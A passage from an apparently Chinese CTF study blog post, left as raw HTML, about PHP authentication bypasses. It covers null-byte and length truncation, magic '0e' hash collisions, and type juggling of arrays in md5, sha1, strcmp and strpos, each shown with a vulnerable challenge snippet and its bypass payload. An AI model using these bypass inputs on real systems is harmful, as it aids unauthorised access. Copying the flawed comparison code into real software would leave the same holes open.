class=\"comment\">#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag</span></span><br><span class=\"line\"><span class=\"comment\">#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。</span></span><br><span class=\"line\"><span class=\"comment\">#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span> ($_GET[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ereg (<span class=\"string\">\"^[a-zA-Z0-9]+$\"</span>,$_GET[<span class=\"string\">'password'</span>]) === <span class=\"keyword\">FALSE</span>)    </span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strlen($_GET[<span class=\"string\">'password'</span>]) &lt; <span class=\"number\">8</span> &amp;&amp; $_GET[<span class=\"string\">'password'</span>] &gt; <span class=\"number\">9999999</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos ($_GET[<span class=\"string\">'password'</span>], <span class=\"string\">'*-*'</span>) !== <span class=\"keyword\">FALSE</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span> . $flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"move-uploaded-file-用-0截断\"><a href=\"#move-uploaded-file-用-0截断\" class=\"headerlink\" title=\"move_uploaded_file 用\\0截断\"></a>move_uploaded_file 用\\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生<br>cve：<br><a href=\"https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\" target=\"_blank\" rel=\"noopener\">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>\n<p><code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\\x00.jpg&quot;)</code><br>上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>\n<h3 id=\"include用？截断\"><a href=\"#include用？截断\" class=\"headerlink\" title=\"include用？截断\"></a>include用？截断</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$name=$_GET[<span class=\"string\">'name'</span>];  </span><br><span class=\"line\">$filename=$name.<span class=\"string\">'.php'</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span> $filename;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br>测试POC：<br><a href=\"http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt</a>?<br>则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>\n<h3 id=\"系统长度截断\"><a href=\"#系统长度截断\" class=\"headerlink\" title=\"系统长度截断\"></a>系统长度截断</h3><p>这种方式在PHP5.3以后的版本中都已经得到了修复。<br>win260个字符，linux下4*1024=4096字节</p>\n<h3 id=\"mysql长度截断\"><a href=\"#mysql长度截断\" class=\"headerlink\" title=\"mysql长度截断\"></a>mysql长度截断</h3><p>mysql内的默认字符长度为255，超过的就没了。<br>由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>\n<h3 id=\"mysql中utf-8截断\"><a href=\"#mysql中utf-8截断\" class=\"headerlink\" title=\"mysql中utf-8截断\"></a>mysql中utf-8截断</h3><p><code>insert into dvwa.test values (14,concat(&quot;admin&quot;,0xc1,&quot;abc&quot;))</code></p>\n<p>写入为admin</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><p>原理</p>\n<p>比较表：<a href=\"http://php.net/manual/zh/types.comparisons.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/types.comparisons.php</a></p>\n<p>以下等式会成立<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">''</span> == <span class=\"number\">0</span> == <span class=\"keyword\">false</span></span><br><span class=\"line\"><span class=\"string\">'123'</span> == <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span> == <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"string\">'123a'</span> == <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"string\">'0x01'</span> == <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"string\">'0e123456789'</span> == <span class=\"string\">'0e987654321'</span></span><br><span class=\"line\">[<span class=\"keyword\">false</span>] == [<span class=\"number\">0</span>] == [<span class=\"keyword\">NULL</span>] == [<span class=\"string\">''</span>]</span><br><span class=\"line\"><span class=\"keyword\">NULL</span> == <span class=\"keyword\">false</span> == <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">true</span> == <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"、-gt-、-lt-的弱类型比较\"><a href=\"#、-gt-、-lt-的弱类型比较\" class=\"headerlink\" title=\"==、&gt;、&lt;的弱类型比较\"></a>==、&gt;、&lt;的弱类型比较</h3><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##方法1</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=\"1e8%00\";</span></span><br><span class=\"line\"><span class=\"comment\">##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1</span></span><br><span class=\"line\"><span class=\"comment\">##方法2</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=[\"a\"];</span></span><br><span class=\"line\"><span class=\"comment\">##使用数组，可以，因为数组恒大于数字或字符串</span></span><br><span class=\"line\"><span class=\"comment\">##方法3</span></span><br><span class=\"line\"><span class=\"comment\">##$a[\"a1\"]=1337a;</span></span><br><span class=\"line\"><span class=\"comment\">##1337a过is_numeric，又由&gt;转成1337与1336比较</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">is_numeric(@$a[<span class=\"string\">\"a1\"</span>])?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;    </span><br><span class=\"line\"><span class=\"keyword\">if</span>(@$a[<span class=\"string\">\"a1\"</span>])&#123;</span><br><span class=\"line\">\t\tvar_dump($a);</span><br><span class=\"line\">        ($a[<span class=\"string\">\"a1\"</span>]&gt;<span class=\"number\">1336</span>)?$v1=<span class=\"number\">1</span>:<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump($v1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"switch-弱类型\"><a href=\"#switch-弱类型\" class=\"headerlink\" title=\"switch 弱类型\"></a>switch 弱类型</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 第一种：弱类型，1e==1</span></span><br><span class=\"line\"><span class=\"comment\">// $x1=1e</span></span><br><span class=\"line\"><span class=\"comment\">// 第二种：利用数组名字bypass</span></span><br><span class=\"line\"><span class=\"comment\">// $x1=1[]</span></span><br><span class=\"line\"><span class=\"comment\">// 传入后为string(3) \"1[]\",但在switch那里为1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'x1'</span>]))</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">        $x1 = $_GET[<span class=\"string\">'x1'</span>]; </span><br><span class=\"line\">        $x1==<span class=\"string\">\"1\"</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"ha?\"</span>):<span class=\"keyword\">NULL</span>; </span><br><span class=\"line\">        <span class=\"keyword\">switch</span> ($x1) </span><br><span class=\"line\">        &#123; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">0</span>: </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: </span><br><span class=\"line\">                $a=<span class=\"number\">1</span>; </span><br><span class=\"line\">                <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"md5比较（0e相等、数组为Null）\"><a href=\"#md5比较（0e相等、数组为Null）\" class=\"headerlink\" title=\"md5比较（0e相等、数组为Null）\"></a>md5比较（0e相等、数组为Null）</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(<span class=\"string\">'240610708'</span>) <span class=\"comment\">//0e462097431906509019562988736854</span></span><br><span class=\"line\">md5(<span class=\"string\">'QNKCDZO'</span>) <span class=\"comment\">//0e830400451993494058024219903391</span></span><br><span class=\"line\"><span class=\"number\">0</span>e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。</span><br><span class=\"line\">md5(<span class=\"string\">'240610708'</span>)==md5(<span class=\"string\">'QNKCDZO'</span>); <span class=\"comment\">//True</span></span><br><span class=\"line\">md5(<span class=\"string\">'240610708'</span>)===md5(<span class=\"string\">'QNKCDZO'</span>); <span class=\"comment\">//False</span></span><br><span class=\"line\"></span><br><span class=\"line\">这样的对应数值还有：</span><br><span class=\"line\">var_dump(md5(<span class=\"string\">'240610708'</span>) == md5(<span class=\"string\">'QNKCDZO'</span>));</span><br><span class=\"line\">var_dump(md5(<span class=\"string\">'aabg7XSs'</span>) == md5(<span class=\"string\">'aabC9RqS'</span>));</span><br><span class=\"line\">var_dump(sha1(<span class=\"string\">'aaroZmOk'</span>) == sha1(<span class=\"string\">'aaK1STfY'</span>));</span><br><span class=\"line\">var_dump(sha1(<span class=\"string\">'aaO8zKZF'</span>) == sha1(<span class=\"string\">'aa3OFF9m'</span>));</span><br><span class=\"line\">var_dump(<span class=\"string\">'0010e2'</span> == <span class=\"string\">'1e3'</span>);</span><br><span class=\"line\">var_dump(<span class=\"string\">'0x1234Ab'</span> == <span class=\"string\">'1193131'</span>);</span><br><span class=\"line\">var_dump(<span class=\"string\">'0xABCdef'</span> == <span class=\"string\">' 0xABCdef'</span>);</span><br></pre></td></tr></table></figure>\n<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方法1</span></span><br><span class=\"line\"><span class=\"comment\">#s1=QNKCDZO&amp;s2=240610708</span></span><br><span class=\"line\"><span class=\"comment\">#方法2</span></span><br><span class=\"line\"><span class=\"comment\">#?s1[]=1&amp;s2[]=2</span></span><br><span class=\"line\"><span class=\"comment\">#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null</span></span><br><span class=\"line\"><span class=\"comment\">#则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])</span></span><br><span class=\"line\">define(<span class=\"string\">'FLAG'</span>, <span class=\"string\">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'s1'</span>] != $_GET[<span class=\"string\">'s2'</span>]</span><br><span class=\"line\">&amp;&amp; md5($_GET[<span class=\"string\">'s1'</span>]) == md5($_GET[<span class=\"string\">'s2'</span>])) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success, flag:\"</span> . FLAG;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null</span></span><br><span class=\"line\">$name = addslashes($_POST[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">$r = $db-&gt;get_row(<span class=\"string\">\"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($r[<span class=\"string\">'pass'</span>] === md5($_POST[<span class=\"string\">'pass'</span>])) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"json传数据-“key”-0\"><a href=\"#json传数据-“key”-0\" class=\"headerlink\" title=\"json传数据{“key”:0}\"></a>json传数据{“key”:0}</h3><p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">application/x-www-form-urlencoded</span><br><span class=\"line\">multipart/form-data</span><br><span class=\"line\">application/json</span><br><span class=\"line\">application/xml</span><br></pre></td></tr></table></figure></p>\n<p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>\n<p>{“key”:”0”}</p>\n<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>\n<p>{“key”:0}</p>\n<h3 id=\"strcmp漏洞1：返回0\"><a href=\"#strcmp漏洞1：返回0\" class=\"headerlink\" title=\"strcmp漏洞1：返回0\"></a>strcmp漏洞1：返回0</h3><p>适用与5.3之前版本的php</p>\n<p><code>int strcmp ( string $str1 , string $str2 )</code><br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##flag[]=admin</span></span><br><span class=\"line\">define(<span class=\"string\">'FLAG'</span>, <span class=\"string\">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (strcmp($_GET[<span class=\"string\">'flag'</span>], FLAG) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success, flag:\"</span> . FLAG;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"strcmp漏洞2：返回Null\"><a href=\"#strcmp漏洞2：返回Null\" class=\"headerlink\" title=\"strcmp漏洞2：返回Null\"></a>strcmp漏洞2：返回Null</h3><p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。<br>array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。<br><code>strcmp($c[1],$d)</code></p>\n<h3 id=\"strcmp漏洞3-判断使用的是\"><a href=\"#strcmp漏洞3-判断使用的是\" class=\"headerlink\" title=\"strcmp漏洞3: 判断使用的是 ==\"></a>strcmp漏洞3: 判断使用的是 ==</h3><p>而判断使用的是==，当NULL==0是 bool(true)</p>\n<h3 id=\"in-array，array-search-弱类型比较\"><a href=\"#in-array，array-search-弱类型比较\" class=\"headerlink\" title=\"in_array，array_search 弱类型比较\"></a>in_array，array_search 弱类型比较</h3><p>松散比较下，任何string都等于true：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'</span></span><br><span class=\"line\"><span class=\"comment\">// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'</span></span><br><span class=\"line\"><span class=\"comment\">// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(is_array(@$a[<span class=\"string\">\"a2\"</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(count($a[<span class=\"string\">\"a2\"</span>])!==<span class=\"number\">5</span> <span class=\"keyword\">OR</span> !is_array($a[<span class=\"string\">\"a2\"</span>][<span class=\"number\">0</span>])) <span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>);</span><br><span class=\"line\">        $pos = array_search(<span class=\"string\">\"ctf\"</span>, $a[<span class=\"string\">\"a2\"</span>]);</span><br><span class=\"line\">        $pos===<span class=\"keyword\">false</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($a[<span class=\"string\">\"a2\"</span>] <span class=\"keyword\">as</span> $key=&gt;$val)&#123;</span><br><span class=\"line\">            $val===<span class=\"string\">\"ctf\"</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $v2=<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"sha1-md5-报错相等绕过（False-False）\"><a href=\"#sha1-md5-报错相等绕过（False-False）\" class=\"headerlink\" title=\"sha1() md5() 报错相等绕过（False === False）\"></a>sha1() md5() 报错相等绕过（False === False）</h3><p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false<br>md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##?name[]=1&amp;password[]=2</span></span><br><span class=\"line\"><span class=\"comment\">## === 两边都是false则成立</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"strpos数组NULL-Null-False\"><a href=\"#strpos数组NULL-Null-False\" class=\"headerlink\" title=\"strpos数组NULL(Null !== False)\"></a>strpos数组NULL(Null !== False)</h3><p>strpos()输入数组出错返回null</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span> ($_GET[<span class=\"string\">'nctf'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (@ereg (<span class=\"string\">\"^[1-9]+$\"</span>, $_GET[<span class=\"string\">'nctf'</span>]) === <span class=\"keyword\">FALSE</span>) <span class=\"comment\"># %00截断</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'必须输入数字才行'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strpos ($_GET[<span class=\"string\">'nctf'</span>], <span class=\"string\">'#biubiubiu'</span>) !== <span class=\"keyword\">FALSE</span>)   </span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'骚年，继续努力吧啊~'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"十六进制与十进制比较\"><a href=\"#十六进制与十进制比较\" class=\"headerlink\" title=\"十六进制与十进制比较\"></a>十六进制与十进制比较</h3><p>== 两边的十六进制与十进制比较，是可以相等的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?password=0xdeadc0de</span></span><br><span class=\"line\"><span class=\"comment\">#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">noother_says_correct</span><span class=\"params\">($temp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $flag = <span class=\"string\">'flag&#123;test&#125;'</span>;</span><br><span class=\"line\">    $one = ord(<span class=\"string\">'1'</span>);  <span class=\"comment\">//ord — 返回字符的 ASCII 码值</span></span><br><span class=\"line\">    $nine = ord(<span class=\"string\">'9'</span>); <span class=\"comment\">//ord — 返回字符的 ASCII 码值</span></span><br><span class=\"line\">    $number = <span class=\"string\">'3735929054'</span>;</span><br><span class=\"line\">    <span class=\"comment\">// Check all the input characters!</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($number); $i++)</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"comment\">// Disallow all the digits!</span></span><br><span class=\"line\">        $digit = ord($temp&#123;$i&#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class=\"comment\">## 1到9不允许，但0允许</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Aha, digit not allowed!</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"flase\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($number == $temp) <span class=\"comment\"># </span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$temp = $_GET[<span class=\"string\">'password'</span>];</span><br><span class=\"line\"><span class=\"keyword\">echo</span> noother_says_correct($temp);</span><br></pre></td></tr></table></figure>\n<h2 id=\"md5注入带入’or’\"><a href=\"#md5注入带入’or’\" class=\"headerlink\" title=\"md5注入带入’or’\"></a>md5注入带入’or’</h2><p>原理：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(string,raw)</span><br><span class=\"line\">raw\t可选。规定十六进制或二进制输出格式：</span><br><span class=\"line\">    <span class=\"keyword\">TRUE</span> - 原始 <span class=\"number\">16</span> 字符二进制格式</span><br><span class=\"line\">    <span class=\"keyword\">FALSE</span> - 默认。<span class=\"number\">32</span> 